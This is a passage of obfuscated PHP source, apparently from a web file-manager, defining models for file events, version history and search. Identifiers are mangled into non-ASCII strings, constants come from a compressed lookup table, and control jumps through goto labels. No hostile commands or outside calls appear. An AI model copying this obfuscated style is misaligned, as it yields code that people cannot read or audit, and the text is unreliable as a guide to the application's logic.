$ÜñØ¯èº + $–ğ¸şªî); $È’ŠÇÊÛ = @fread($this->source, $Ú“öèÑñ); fseek_64($this->source, $ÜñØ¯èº); return $È’ŠÇÊÛ; } } public function hashMd5($™”Ã–´ú = false) { return md5($this->getContent()); } public static function hash($ˆÁŸ‡å, $£Ã›Ø = 0) { $ÌøµÁ­Ã = new PathDriverStream($ˆÁŸ‡å, $£Ã›Ø); return $ÌøµÁ­Ã->hashSimple($ˆÁŸ‡å); } public static function md5($û¼²–Ã¹, $ğğÁ­àŠ = 0) { $ü¥é¡­— = new PathDriverStream($û¼²–Ã¹, $ğğÁ­àŠ); return $ü¥é¡­—->hashMd5($û¼²–Ã¹); } } goto cğ‘Ó³İ¬µ; aËáˆ›°ë·: define($_SERVER[Ñ¯©ç][0], $_SERVER[Ñ¯©ç][1]); $_SERVER[©ş­®ò«] = explode($_SERVER[Ñ¯©ç][2], gzinflate(substr($_SERVER[Ñ¯©ç][3], 10, -8))); function binCheckEq($¾Ğµä˜±, $®Å¸¼§) { return $¾Ğµä˜± == $®Å¸¼§; } goto b‘®ÈÇá¬ ; fö„›é˜æ’: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\143\145\x5f\x65\166\145\x6e\164"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\x54\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\x74", "\146\x75\x6e\143\164\x69\157\156"), array("\x64\x65\163\x63", '', "\151\x6e\163\145\x72\164\54\x75\x70\x64\141\x74\x65\54\x73\x65\x6c\145\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ü¤ÀÉ‘¤, $æúºñ²š, $Ø›·×Àã = '') { $Ù•×ìÊÀ =& $_SERVER[Ñ¯©ç]; if (!$this->eventSave) { return; } $¸°Æ¸¹‚ = Model($Ù•×ìÊÀ[1391])->sourceInfo($Ü¤ÀÉ‘¤); if (!$¸°Æ¸¹‚) { return !1; } if ($this->isDisableEvent($¸°Æ¸¹‚, $æúºñ²š)) { return; } if ($Ø›·×Àã && is_string($Ø›·×Àã)) { $Ø›·×Àã = array($Ù•×ìÊÀ[1994] => $Ø›·×Àã); } $¯“è§úÖ = defined($Ù•×ìÊÀ[2178]) ? USER_ID : 0; $º”„®õ = array($Ù•×ìÊÀ[474] => $Ü¤ÀÉ‘¤, $Ù•×ìÊÀ[2179] => $¸°Æ¸¹‚[$Ù•×ìÊÀ[193]], $Ù•×ìÊÀ[2180] => $¸°Æ¸¹‚[$Ù•×ìÊÀ[32]], $Ù•×ìÊÀ[566] => !empty($¸°Æ¸¹‚[$Ù•×ìÊÀ[566]]) ? $¸°Æ¸¹‚[$Ù•×ìÊÀ[566]] : $Ù•×ìÊÀ[12], $Ù•×ìÊÀ[1748] => $¯“è§úÖ, $Ù•×ìÊÀ[479] => $æúºñ²š, $Ù•×ìÊÀ[1750] => $Ø›·×Àã); $this->addSystemLog($æúºñ²š, $º”„®õ); unset($º”„®õ[$Ù•×ìÊÀ[2180]], $º”„®õ[$Ù•×ìÊÀ[566]]); return $this->add($º”„®õ); } private function addSystemLog($½÷ÈËÁ¥, $şí™Ç×ï) { $Òèìîì§ =& $_SERVER[Ñ¯©ç]; if ($½÷ÈËÁ¥ == $Òèìîì§[2181]) { $½÷ÈËÁ¥ = $şí™Ç×ï[$Òèìîì§[509]][$Òèìîì§[2182]]; } else { if (in_array($½÷ÈËÁ¥, array($Òèìîì§[1935], $Òèìîì§[2183]))) { $½÷ÈËÁ¥ = $şí™Ç×ï[$Òèìîì§[509]][$Òèìîì§[807]]; } } $ˆ§š“‰ó = array_merge($şí™Ç×ï, array($Òèìîì§[2184] => $şí™Ç×ï[$Òèìîì§[194]], $Òèìîì§[2185] => $şí™Ç×ï[$Òèìîì§[2185]])); Hook::trigger($Òèìîì§[2186], $Òèìîì§[2187] . $½÷ÈËÁ¥, $şí™Ç×ï); Model($Òèìîì§[1899])->addLog($Òèìîì§[2187] . $½÷ÈËÁ¥, $ˆ§š“‰ó); } private function isDisableEvent($ÊËÁ”Ì†, $Ô´­–­µ) { $ôÔãŠ†Œ =& $_SERVER[Ñ¯©ç]; if ($ÊËÁ”Ì†[$ôÔãŠ†Œ[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Ô´­–­µ == $ôÔãŠ†Œ[1924]) { return !1; } return !0; } public function eventCreate($¯ìâùó, $òËêÂ˜) { $À¶Å¯Œİ =& $_SERVER[Ñ¯©ç]; $°ÆÖ³ò = Model($À¶Å¯Œİ[1391])->sourceInfo($¯ìâùó); $´±¸éáå = array($À¶Å¯Œİ[2182] => $òËêÂ˜, $À¶Å¯Œİ[32] => $°ÆÖ³ò[$À¶Å¯Œİ[32]]); return $this->addEvent($¯ìâùó, $À¶Å¯Œİ[2181], $´±¸éáå); } public function eventFileEdit($âûñöÖ) { $šò½´˜› =& $_SERVER[Ñ¯©ç]; $ËÈìäŠ“ = array($šò½´˜›[2188] => $_SERVER[$šò½´˜›[2189]], $šò½´˜›[2190] => strtolower(ACTION)); if (isset($GLOBALS[$šò½´˜›[7]][$šò½´˜›[2191]])) { $ËÈìäŠ“[$šò½´˜›[2191]] = $šò½´˜›[101]; } return $this->addEvent($âûñöÖ, $šò½´˜›[1925], $ËÈìäŠ“); } public function eventRecycle($·¶ïÊ¥û, $şÎÄ˜ê) { return $this->addEvent($·¶ïÊ¥û, $_SERVER[Ñ¯©ç][2183], $şÎÄ˜ê); } public function eventRemove($ÕœÑÏëñ) { $—…ÒÕç¯ =& $_SERVER[Ñ¯©ç]; $“ùä²›è = Model($—…ÒÕç¯[1391])->sourceInfo($ÕœÑÏëñ); $ÁÔèµµ = array_field_key($“ùä²›è, array($—…ÒÕç¯[194], $—…ÒÕç¯[524], $—…ÒÕç¯[488], $—…ÒÕç¯[568])); $ÊÕ‘ˆë = array($—…ÒÕç¯[807] => $“ùä²›è[$—…ÒÕç¯[32]], $—…ÒÕç¯[2190] => ACTION, $—…ÒÕç¯[2192] => $ÁÔèµµ); return $this->addEvent($“ùä²›è[$—…ÒÕç¯[193]], $—…ÒÕç¯[1924], $ÊÕ‘ˆë); } public function eventShare($Ì­¡éÖ, $¯¸¬ßÜì) { return $this->addEvent($Ì­¡éÖ, $_SERVER[Ñ¯©ç][1935], $¯¸¬ßÜì); } public function eventMove($ñœ’÷ò³, $¬÷Ì¸á, $ËÀ™ÉŒ«) { $¶øÖ‚Ÿ =& $_SERVER[Ñ¯©ç]; $¿ øõ½ = Model($¶øÖ‚Ÿ[1391]); $ğÅ§Æ¤“ = $¿ øõ½->sourceInfo($ñœ’÷ò³); $·£ÍÂÁ† = $¿ øõ½->sourceInfo($¬÷Ì¸á); $º­´‘É = $¿ øõ½->sourceInfo($ËÀ™ÉŒ«); $ò²¥èİ– = array($¶øÖ‚Ÿ[1216] => $¬÷Ì¸á, $¶øÖ‚Ÿ[2193] => $·£ÍÂÁ†[$¶øÖ‚Ÿ[32]], $¶øÖ‚Ÿ[2169] => !empty($·£ÍÂÁ†[$¶øÖ‚Ÿ[566]]) ? $·£ÍÂÁ†[$¶øÖ‚Ÿ[566]] : $¶øÖ‚Ÿ[12], $¶øÖ‚Ÿ[1217] => $ËÀ™ÉŒ«, $¶øÖ‚Ÿ[2194] => $º­´‘É[$¶øÖ‚Ÿ[32]], $¶øÖ‚Ÿ[2195] => !empty($º­´‘É[$¶øÖ‚Ÿ[566]]) ? $º­´‘É[$¶øÖ‚Ÿ[566]] : $¶øÖ‚Ÿ[12]); $this->addEvent($ñœ’÷ò³, $¶øÖ‚Ÿ[603], $ò²¥èİ–); $ğÅ§Æ¤“ = $¿ øõ½->sourceInfo($ñœ’÷ò³); $ò²¥èİ– = array($¶øÖ‚Ÿ[194] => $ğÅ§Æ¤“[$¶øÖ‚Ÿ[194]], $¶øÖ‚Ÿ[32] => $ğÅ§Æ¤“[$¶øÖ‚Ÿ[32]]); $this->addEvent($¬÷Ì¸á, $¶øÖ‚Ÿ[2196], $ò²¥èİ–); } public function eventCopy($´ú¥ı§) { $this->eventCreate($´ú¥ı§, $_SERVER[Ñ¯©ç][601]); } public function eventRename($¥ø“®“, $²Üòï—ú, $•ç‡¸§) { $½Ò»¯ğ =& $_SERVER[Ñ¯©ç]; $¬Êëû¡¥ = array($½Ò»¯ğ[1216] => $²Üòï—ú, $½Ò»¯ğ[1217] => $•ç‡¸§); return $this->addEvent($¥ø“®“, $½Ò»¯ğ[1405], $¬Êëû¡¥); } public function eventAddComment($€àéŸ², $…æŒš¤Í) { return $this->addEvent($€àéŸ², $_SERVER[Ñ¯©ç][2197], $…æŒš¤Í); } public function eventAddDesc($½ÂÊÎ, $š½ëş­„) { return $this->addEvent($½ÂÊÎ, $_SERVER[Ñ¯©ç][2198], $š½ëş­„); } public function listBySource($§¥ºØ‚) { $ÖªŠû¨ú =& $_SERVER[Ñ¯©ç]; $Åöæò¦ˆ = Model($ÖªŠû¨ú[1391])->sourceInfo($§¥ºØ‚); $çì±òÅÇ = array($ÖªŠû¨ú[474] => $§¥ºØ‚); if ($Åöæò¦ˆ[$ÖªŠû¨ú[468]] == $ÖªŠû¨ú[101]) { $ˆ‚Õ¯ğ§ = Model($ÖªŠû¨ú[1391])->listSearchChildren($§¥ºØ‚, 20000); $ˆ‚Õ¯ğ§[] = $§¥ºØ‚ . $ÖªŠû¨ú[63]; $çì±òÅÇ = array($ÖªŠû¨ú[194] => array($ÖªŠû¨ú[7], $ˆ‚Õ¯ğ§)); } $×Ã‚„ì‹ = $this->where($çì±òÅÇ)->order($ÖªŠû¨ú[2199])->selectPage(); if ($×Ã‚„ì‹[$ÖªŠû¨ú[426]][$ÖªŠû¨ú[427]] == 0) { $×Ã‚„ì‹[$ÖªŠû¨ú[426]][$ÖªŠû¨ú[427]] = 1; $×Ã‚„ì‹[$ÖªŠû¨ú[429]] = array(array($ÖªŠû¨ú[474] => $§¥ºØ‚, $ÖªŠû¨ú[2179] => $Åöæò¦ˆ[$ÖªŠû¨ú[193]], $ÖªŠû¨ú[1748] => $Åöæò¦ˆ[$ÖªŠû¨ú[510]], $ÖªŠû¨ú[479] => $ÖªŠû¨ú[2200], $ÖªŠû¨ú[480] => $Åöæò¦ˆ[$ÖªŠû¨ú[232]], $ÖªŠû¨ú[1750] => $ÖªŠû¨ú[12])); } return $this->eventListParse($×Ã‚„ì‹, $§¥ºØ‚); } private function eventListParse($ÍôşÖ§, $‰ğÏ‡ÆÈ) { $ñ¿²®†Ê =& $_SERVER[Ñ¯©ç]; $Û‚”ŠÎ„ = $ÍôşÖ§[$ñ¿²®†Ê[429]]; $Œ³¤—ğÛ = array_to_keyvalue($Û‚”ŠÎ„, $ñ¿²®†Ê[12], $ñ¿²®†Ê[194]); $”Õà—ÇŞ = array_to_keyvalue($Û‚”ŠÎ„, $ñ¿²®†Ê[12], $ñ¿²®†Ê[2185]); foreach ($Û‚”ŠÎ„ as $¬ÁĞšó) { $µ¤¦ÙÉÇ = $¬ÁĞšó[$ñ¿²®†Ê[509]]; if ($¬ÁĞšó[$ñ¿²®†Ê[33]] == $ñ¿²®†Ê[603] && isset($µ¤¦ÙÉÇ[$ñ¿²®†Ê[1216]])) { $Œ³¤—ğÛ[] = $µ¤¦ÙÉÇ[$ñ¿²®†Ê[1216]] . $ñ¿²®†Ê[12]; $Œ³¤—ğÛ[] = $µ¤¦ÙÉÇ[$ñ¿²®†Ê[1217]] . $ñ¿²®†Ê[12]; } if ($¬ÁĞšó[$ñ¿²®†Ê[33]] == $ñ¿²®†Ê[2196] && isset($µ¤¦ÙÉÇ[$ñ¿²®†Ê[194]])) { $Œ³¤—ğÛ[] = $µ¤¦ÙÉÇ[$ñ¿²®†Ê[194]] . $ñ¿²®†Ê[12]; } } $Œ³¤—ğÛ = array_merge($Œ³¤—ğÛ, $”Õà—ÇŞ, array($‰ğÏ‡ÆÈ . $ñ¿²®†Ê[12])); $Œ³¤—ğÛ = array_unique($Œ³¤—ğÛ); $üğ¯Ç = array_unique(array_to_keyvalue($Û‚”ŠÎ„, $ñ¿²®†Ê[12], $ñ¿²®†Ê[1757])); $×Ã±éè¶ = Model($ñ¿²®†Ê[582])->userListInfo($üğ¯Ç); $§‡Ï«¡¹ = Model($ñ¿²®†Ê[877])->sourceListInfo($Œ³¤—ğÛ, !0); foreach ($Û‚”ŠÎ„ as &$¬ÁĞšó) { if ($¬ÁĞšó[$ñ¿²®†Ê[33]] == $ñ¿²®†Ê[603] && isset($¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[1216]])) { $¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[1216]] = $§‡Ï«¡¹[$¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[1216]]]; $¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[1217]] = $§‡Ï«¡¹[$¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[1217]]]; } if ($¬ÁĞšó[$ñ¿²®†Ê[33]] == $ñ¿²®†Ê[2196] && isset($¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[194]])) { $¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[194]] = $§‡Ï«¡¹[$¬ÁĞšó[$ñ¿²®†Ê[509]][$ñ¿²®†Ê[194]]]; } $¬ÁĞšó[$ñ¿²®†Ê[100]] = $§‡Ï«¡¹[$¬ÁĞšó[$ñ¿²®†Ê[194]]]; $¬ÁĞšó[$ñ¿²®†Ê[2201]] = $§‡Ï«¡¹[$¬ÁĞšó[$ñ¿²®†Ê[2185]]]; if ($¬ÁĞšó[$ñ¿²®†Ê[33]] == $ñ¿²®†Ê[1924]) { $¬ÁĞšó[$ñ¿²®†Ê[2201]] = $¬ÁĞšó[$ñ¿²®†Ê[100]]; $¬ÁĞšó[$ñ¿²®†Ê[2185]] = $¬ÁĞšó[$ñ¿²®†Ê[2201]][$ñ¿²®†Ê[194]]; $¬ÁĞšó[$ñ¿²®†Ê[100]] = !1; $¬ÁĞšó[$ñ¿²®†Ê[194]] = $ñ¿²®†Ê[12]; } $¬ÁĞšó[$ñ¿²®†Ê[2128]] = $×Ã±éè¶[$¬ÁĞšó[$ñ¿²®†Ê[1757]]]; } unset($¬ÁĞšó); $ÍôşÖ§[$ñ¿²®†Ê[429]] = $Û‚”ŠÎ„; return $ÍôşÖ§; } public function removeBySource($“ÎÇ£·Œ) { $Ø¦Íõ·º = array($_SERVER[Ñ¯©ç][474] => $“ÎÇ£·Œ); $this->where($Ø¦Íõ·º)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\143\x65\137\150\x69\x73\164\157\162\171"; public function historyCount($€¶İæå) { $×¡¶øõ¬ =& $_SERVER[Ñ¯©ç]; if (!$€¶İæå) { return array(); } if (is_string($€¶İæå) || is_int($€¶İæå)) { $€¶İæå = array($€¶İæå); } $ÒÅ£¼˜ = array($×¡¶øõ¬[194], $×¡¶øõ¬[1988] => $×¡¶øõ¬[549]); $§İ÷©Şµ = array($×¡¶øõ¬[194] => array($×¡¶øõ¬[7], $€¶İæå)); $ÄÚØÀÔ§ = $this->field($ÒÅ£¼˜)->where($§İ÷©Şµ)->group($×¡¶øõ¬[194])->select(); return array_to_keyvalue($ÄÚØÀÔ§, $×¡¶øõ¬[194], $×¡¶øõ¬[549]); } public function addHistory($Ë£÷—­×, $¨ÖÛ¡Æ± = '') { $–ÜÁ€Æé =& $_SERVER[Ñ¯©ç]; $ŞÍ›­ùâ = array($–ÜÁ€Æé[474] => $Ë£÷—­×[$–ÜÁ€Æé[194]], $–ÜÁ€Æé[1748] => isset($Ë£÷—­×[$–ÜÁ€Æé[512]]) ? $Ë£÷—­×[$–ÜÁ€Æé[512]] : $Ë£÷—­×[$–ÜÁ€Æé[510]], $–ÜÁ€Æé[525] => $Ë£÷—­×[$–ÜÁ€Æé[524]], $–ÜÁ€Æé[600] => $Ë£÷—­×[$–ÜÁ€Æé[89]], $–ÜÁ€Æé[2202] => $¨ÖÛ¡Æ±); if ($GLOBALS[$–ÜÁ€Æé[6]][$–ÜÁ€Æé[102]][$–ÜÁ€Æé[1274]] >= 1) { $this->historyAutoClear($ŞÍ›­ùâ[$–ÜÁ€Æé[194]]); $this->add($ŞÍ›­ùâ); } Hook::trigger($–ÜÁ€Æé[2203], $ŞÍ›­ùâ); Model($–ÜÁ€Æé[2204])->eventFileEdit($Ë£÷—­×[$–ÜÁ€Æé[194]]); } private function historyAutoClear($¡¸Ô—Ê¹) { $“±ÛÍ ó =& $_SERVER[Ñ¯©ç]; $Ô´äÃ£¼ = Model($“±ÛÍ ó[823])->get($“±ÛÍ ó[1296]); $Èƒ§ñ‡ö = intval($GLOBALS[$“±ÛÍ ó[6]][$“±ÛÍ ó[102]][$“±ÛÍ ó[1274]]); $¯µæ¦±É = $Ô´äÃ£¼ == $“±ÛÍ ó[1297] ? min(5, $Èƒ§ñ‡ö) : $Èƒ§ñ‡ö; $¯µæ¦±É = $¯µæ¦±É <= 0 ? 0 : $¯µæ¦±É - 1; if ($¯µæ¦±É >= 500) { return; } $Ÿ¿µÌÜ = array($“±ÛÍ ó[474] => $¡¸Ô—Ê¹); $ƒÉ­Ê½“ = $this->field($“±ÛÍ ó[2205])->where($Ÿ¿µÌÜ)->order($“±ÛÍ ó[2199])->select(); if (!$ƒÉ­Ê½“ || $¯µæ¦±É >= count($ƒÉ­Ê½“)) { return; } $—ÑêÚÁî = array_to_keyvalue($ƒÉ­Ê½“, $“±ÛÍ ó[12], $“±ÛÍ ó[458]); $—ÑêÚÁî = array_slice($—ÑêÚÁî, $¯µæ¦±É); $ªÁºö­ = array_to_keyvalue($ƒÉ­Ê½“, $“±ÛÍ ó[12], $“±ÛÍ ó[524]); $ªÁºö­ = array_slice($ªÁºö­, $¯µæ¦±É); if (!$—ÑêÚÁî || !$ªÁºö­) { return; } $Ÿ¿µÌÜ = array($“±ÛÍ ó[476] => array($“±ÛÍ ó[7], $—ÑêÚÁî)); $this->where($Ÿ¿µÌÜ)->delete(); Model($“±ÛÍ ó[527])->remove($ªÁºö­); } public function listData($‚¶©ã•¢) { $²â³Ì›° =& $_SERVER[Ñ¯©ç]; $§ß½¹™£ = array($²â³Ì›°[474] => $‚¶©ã•¢); $¤ŞÒ£İÜ = $²â³Ì›°[2206]; $‹­‡ˆ±‚ = $this->field($¤ŞÒ£İÜ)->where($§ß½¹™£)->order($²â³Ì›°[2199])->selectPage(); $this->_listAppendUser($‹­‡ˆ±‚[$²â³Ì›°[429]]); $—ğ´Î«º = Model($²â³Ì›°[823])->get($²â³Ì›°[1296]); $ÄĞÀòãå = 5; if ($—ğ´Î«º == $²â³Ì›°[1297]) { $‹­‡ˆ±‚[$²â³Ì›°[429]] = array_slice($‹­‡ˆ±‚[$²â³Ì›°[429]], 0, $ÄĞÀòãå); $‹­‡ˆ±‚[$²â³Ì›°[426]] = array($²â³Ì›°[2207] => 1, $²â³Ì›°[2208] => 20, $²â³Ì›°[2209] => 1, $²â³Ì›°[2210] => count($‹­‡ˆ±‚[$²â³Ì›°[429]])); } return $‹­‡ˆ±‚; } protected function _listAppendUser(&$•ë”¡ëÁ) { $¤úºÜÀ¸ =& $_SERVER[Ñ¯©ç]; $¸áï½ô = array_to_keyvalue($•ë”¡ëÁ, $¤úºÜÀ¸[12], $¤úºÜÀ¸[1757]); $±Ö‰ÏŞ§ = Model($¤úºÜÀ¸[582])->userListInfo($¸áï½ô); foreach ($•ë”¡ëÁ as &$çĞÍ¹†) { $®²ÑşÒı = $çĞÍ¹†[$¤úºÜÀ¸[1757]]; $çĞÍ¹†[$¤úºÜÀ¸[510]] = $±Ö‰ÏŞ§[$®²ÑşÒı] ? $±Ö‰ÏŞ§[$®²ÑşÒı] : !1; } unset($çĞÍ¹†); } public function fileInfo($­Ş­ÉëÑ) { $û¸õîª =& $_SERVER[Ñ¯©ç]; $¦‚—›‡º = $this->tablePrefix; $ÙÄæÁ‚ = "{$¦‚—›‡º}\151\x6f\137\x66\x69\154\x65\x20\x66\151\154\x65\163\x20\157\156\x20\146\151\154\145\x73\56\x66\151\x6c\x65\111\x44\x20\x3d\x20\x68\x69\163\x74\157\x72\171\56\x66\151\x6c\x65\x49\x44"; return $this->alias($û¸õîª[2211])->where(array($û¸õîª[476] => $­Ş­ÉëÑ))->join($ÙÄæÁ‚, $û¸õîª[2212])->find(); } public function removeItem($†â¸£ß) { $¯ø±åê± =& $_SERVER[Ñ¯©ç]; $Œ­Œà¢Ü = array($¯ø±åê±[476] => $†â¸£ß); $•‹‹Ùì = $this->where($Œ­Œà¢Ü)->find(); if ($•‹‹Ùì) { $¢èÎ°áæ = $this->where($Œ­Œà¢Ü)->delete(); Model($¯ø±åê±[527])->remove($•‹‹Ùì[$¯ø±åê±[524]]); return $¢èÎ°áæ; } return !1; } public function removeBySource($´÷ÀÍ½) { $¼·îşƒá =& $_SERVER[Ñ¯©ç]; if (!$´÷ÀÍ½) { return !1; } if (!is_array($´÷ÀÍ½)) { $´÷ÀÍ½ = array($´÷ÀÍ½); } $¼ùÔ¤Œ = array($¼·îşƒá[474] => array($¼·îşƒá[7], $´÷ÀÍ½)); $Õé…å˜õ = $this->field($¼·îşƒá[525])->where($¼ùÔ¤Œ)->select(); if ($Õé…å˜õ) { $this->where($¼ùÔ¤Œ)->delete(); $à¡ıœÚ½ = array_to_keyvalue($Õé…å˜õ, $¼·îşƒá[12], $¼·îşƒá[524]); Model($¼·îşƒá[527])->remove($à¡ıœÚ½); } return !0; } public function setDetail($ñØş–Æ–, $òóÌˆ¢¾) { $ÇØ‹ï³Ä =& $_SERVER[Ñ¯©ç]; return $this->where(array($ÇØ‹ï³Ä[476] => $ñØş–Æ–))->save(array($ÇØ‹ï³Ä[2202] => $òóÌˆ¢¾)); } public function rollbackToItem($¦í›±š, $½ÊæšÍ¯) { $ø‘¶¯Œü =& $_SERVER[Ñ¯©ç]; $•¬ÔË³ú = Model($ø‘¶¯Œü[877])->sourceInfo($¦í›±š); $this->addHistory($•¬ÔË³ú, LNG($ø‘¶¯Œü[2213])); $„ÒšÓŸ = $this->find($½ÊæšÍ¯); $Áı˜Ü« = array($ø‘¶¯Œü[524] => $„ÒšÓŸ[$ø‘¶¯Œü[524]], $ø‘¶¯Œü[89] => $„ÒšÓŸ[$ø‘¶¯Œü[89]], $ø‘¶¯Œü[98] => time(), $ø‘¶¯Œü[512] => USER_ID); Model($ø‘¶¯Œü[877])->where(array($ø‘¶¯Œü[194] => $¦í›±š))->save($Áı˜Ü«); return $this->where(array($ø‘¶¯Œü[476] => $½ÊæšÍ¯))->delete(); } public function clearSame($íÀê­Ø›) { $ÂÕµÄÄè =& $_SERVER[Ñ¯©ç]; $â²˜–û† = $this->listData($íÀê­Ø›); $ÖŒó£½ = array_to_keyvalue_group($â²˜–û†, $ÂÕµÄÄè[524]); $š¶–Ş¨‹ = array(); $ÌØ¦ÖŞÂ = array(); foreach ($ÖŒó£½ as $ü½šÇµ) { if (!$ü½šÇµ || count($ü½šÇµ) <= 1) { continue; } foreach ($ü½šÇµ as $¥òïŞÇ„) { $š¶–Ş¨‹[] = $¥òïŞÇ„[$ÂÕµÄÄè[524]]; $ÌØ¦ÖŞÂ[] = $¥òïŞÇ„[$ÂÕµÄÄè[458]]; } } if (!$ÌØ¦ÖŞÂ) { return; } $this->where(array($ÂÕµÄÄè[458] => array($ÂÕµÄÄè[7], $ÌØ¦ÖŞÂ)))->delete(); Model($ÂÕµÄÄè[527])->remove($š¶–Ş¨‹); } public function userSpace() { $Ë‰ó Í® =& $_SERVER[Ñ¯©ç]; $ÅÂšƒØ = $this->tablePrefix; $îÁàá×· = array($Ë‰ó Í®[1748] => USER_ID); $ºëãÉĞ = "{$ÅÂšƒØ}\x69\157\x5f\x66\x69\x6c\x65\40\146\x69\154\x65\x73\40\157\156\x20\x66\x69\154\x65\163\56\x66\x69\154\x65\x49\x44\x20\75\x20\150\x69\163\x74\x6f\162\171\56\x66\151\154\x65\x49\x44"; return $this->alias($Ë‰ó Í®[2211])->where($îÁàá×·)->join($ºëãÉĞ, $Ë‰ó Í®[2212])->sum($Ë‰ó Í®[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($û¸‚ÏÔ¯) { $åó¢åœ =& $_SERVER[Ñ¯©ç]; $©Š–‰×¤ = KodIO::fileTypeList(); $»ÇÙ†¶é = $©Š–‰×¤[$û¸‚ÏÔ¯]; if (!$»ÇÙ†¶é) { return array(); } $‚¢ı´›™ = $»ÇÙ†¶é[$åó¢åœ[188]]; $—ËØÔ“ = $åó¢åœ[7]; if (!$»ÇÙ†¶é[$åó¢åœ[188]]) { $²‰Â•§” = array_to_keyvalue($©Š–‰×¤, $åó¢åœ[12], $åó¢åœ[188]); $‚¢ı´›™ = implode($åó¢åœ[50], $²‰Â•§”); $—ËØÔ“ = $åó¢åœ[2214]; } $¨ˆåíí = explode($åó¢åœ[50], trim($‚¢ı´›™, $åó¢åœ[50])); return array($—ËØÔ“, $¨ˆåíí); } public function listPathType($¨Š×ô¿) { $ê½ôÕ‘ =& $_SERVER[Ñ¯©ç]; $§ÆÇÀğ¯ = $this->fileTypeWhere($¨Š×ô¿); if (!$§ÆÇÀğ¯) { return array(); } $œÂ†æé¡ = USER_ID; $½ô£ÊÖ® = Model($ê½ôÕ‘[582])->getInfo($œÂ†æé¡); $½Ò‘Çàê = array($ê½ôÕ‘[631] => SourceModel::TYPE_USER, $ê½ôÕ‘[568] => array($ê½ôÕ‘[595], $ê½ôÕ‘[578] . $½ô£ÊÖ®[$ê½ôÕ‘[100]][$ê½ôÕ‘[194]] . $ê½ôÕ‘[596]), $ê½ôÕ‘[632] => $œÂ†æé¡, $ê½ôÕ‘[629] => 0, $ê½ôÕ‘[630] => $§ÆÇÀğ¯); return $this->listSource($½Ò‘Çàê); } public function listSearch($€àÆÜà‚, $À›Ìø§æ = 300) { $å°­½Œ‰ =& $_SERVER[Ñ¯©ç]; if (isset($€àÆÜà‚[$å°­½Œ‰[2050]]) && $€àÆÜà‚[$å°­½Œ‰[2050]]) { $€àÆÜà‚[$å°­½Œ‰[2050]] = str_replace($å°­½Œ‰[443], $å°­½Œ‰[2215], trim($€àÆÜà‚[$å°­½Œ‰[2050]])); } $ËÃÆ‹œï = $this->_parseSearchWhere($€àÆÜà‚); if (!isset($ËÃÆ‹œï[$å°­½Œ‰[488]])) { $ËÃÆ‹œï[$å°­½Œ‰[488]] = 0; } $Ô‡¯Àµ = $å°­½Œ‰[2216]; $ÃõãîÑ¯ = $ËÃÆ‹œï; $„âò’²ã = $Ô‡¯Àµ; $this->_listSearchBindPinyin($€àÆÜà‚, $ËÃÆ‹œï, $Ô‡¯Àµ); $this->alias($å°­½Œ‰[502])->_makeOrder(); $ËÃÆ‹œï = $this->parseWhereLike($ËÃÆ‹œï); $â¯Ã¿š© = $this->distinct(!0)->field($Ô‡¯Àµ)->where($ËÃÆ‹œï)->selectPage($À›Ìø§æ); if ($GLOBALS[$å°­½Œ‰[6]][$å°­½Œ‰[440]][$å°­½Œ‰[441]] && Input::check($€àÆÜà‚[$å°­½Œ‰[2050]], $å°­½Œ‰[638]) && $â¯Ã¿š©[$å°­½Œ‰[426]][$å°­½Œ‰[413]] == 1 && $â¯Ã¿š©[$å°­½Œ‰[426]][$å°­½Œ‰[427]] == 0) { $â¯Ã¿š© = $this->distinct(!0)->field($Ô‡¯Àµ)->where($ÃõãîÑ¯)->limit(1000)->select(); $â¯Ã¿š© = array_page_split($â¯Ã¿š©, !1, $À›Ìø§æ); } $this->_listSearchFileContent($â¯Ã¿š©, $€àÆÜà‚, $„âò’²ã, $ÃõãîÑ¯); $this->_listSearchDesc($â¯Ã¿š©, $€àÆÜà‚, $„âò’²ã); $this->_listSearchTag($â¯Ã¿š©, $€àÆÜà‚, $„âò’²ã); $this->_listSearchGroupTag($â¯Ã¿š©, $€àÆÜà‚, $„âò’²ã); $this->_listDataApply($â¯Ã¿š©[$å°­½Œ‰[429]]); $this->_listMake($â¯Ã¿š©); return $â¯Ã¿š©; } private function _listSearchFileContent(&$ƒöèûÙÆ, $†ğ«ÍÍ«, $¹½õÑŠ, $³ß ÓªŠ) { $ÉÛºƒï… =& $_SERVER[Ñ¯©ç]; if (!$†ğ«ÍÍ«[$ÉÛºƒï…[2050]] || $ƒöèûÙÆ[$ÉÛºƒï…[426]][$ÉÛºƒï…[413]] > 1) { return; } if (!isset($³ß ÓªŠ[$ÉÛºƒï…[32]]) || !is_array($†ğ«ÍÍ«[$ÉÛºƒï…[524]])) { return; } $³ß ÓªŠ[$ÉÛºƒï…[524]] = array($ÉÛºƒï…[7], $†ğ«ÍÍ«[$ÉÛºƒï…[524]]); unset($³ß ÓªŠ[$ÉÛºƒï…[32]]); unset($†ğ«ÍÍ«[$ÉÛºƒï…[524]]); $§ÌÉÛ–¹ = $this->field($¹½õÑŠ)->where($³ß ÓªŠ)->limit($ÉÛºƒï…[2217])->select(); if (!$§ÌÉÛ–¹ || count($§ÌÉÛ–¹) == 0) { return; } $ƒöèûÙÆ[$ÉÛºƒï…[429]] = array_merge($§ÌÉÛ–¹, $ƒöèûÙÆ[$ÉÛºƒï…[429]]); $ƒöèûÙÆ[$ÉÛºƒï…[426]][$ÉÛºƒï…[427]] += count($§ÌÉÛ–¹); } private function _listSearchTag(&$™åşšˆæ, $®ïËìä°, $‡„•ÅáÕ) { $¾şí«î« =& $_SERVER[Ñ¯©ç]; if 